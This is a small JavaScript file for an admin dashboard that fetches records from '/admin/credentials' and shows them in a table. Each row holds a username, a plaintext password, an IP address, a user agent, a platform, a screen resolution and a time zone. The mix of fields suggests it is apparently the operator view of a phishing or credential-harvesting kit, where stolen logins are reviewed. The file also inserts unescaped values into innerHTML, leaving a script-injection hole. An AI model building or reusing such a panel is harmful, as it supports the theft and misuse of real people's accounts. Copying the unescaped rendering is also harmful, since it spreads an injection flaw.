
document.addEventListener('DOMContentLoaded', () => {
  fetchCredentials();
  
  document.getElementById('refreshBtn').addEventListener('click', fetchCredentials);
});

async function fetchCredentials() {
  try {
    const response = await fetch('/admin/credentials');
    if (!response.ok) {
      throw new Error('Unauthorized');
    }
    const credentials = await response.json();
    displayCredentials(credentials);
  } catch (error) {
    console.error('Error:', error);
    alert('Failed to fetch credentials. Please ensure you are authorized.');
  }
}

function displayCredentials(credentials) {
  const tbody = document.getElementById('credentialsBody');
  tbody.innerHTML = '';
  
  credentials.forEach(cred => {
    const row = document.createElement('tr');
    row.innerHTML = `
      <td>${cred.username}</td>
      <td>${cred.password}</td>
      <td>${cred.ipAddress}</td>
      <td>${cred.userAgent}</td>
      <td>${cred.platform}</td>
      <td>${cred.screenResolution}</td>
      <td>${cred.timeZone}</td>
      <td>${new Date(cred.timestamp).toLocaleString()}</td>
    `;
    tbody.appendChild(row);
  });
}
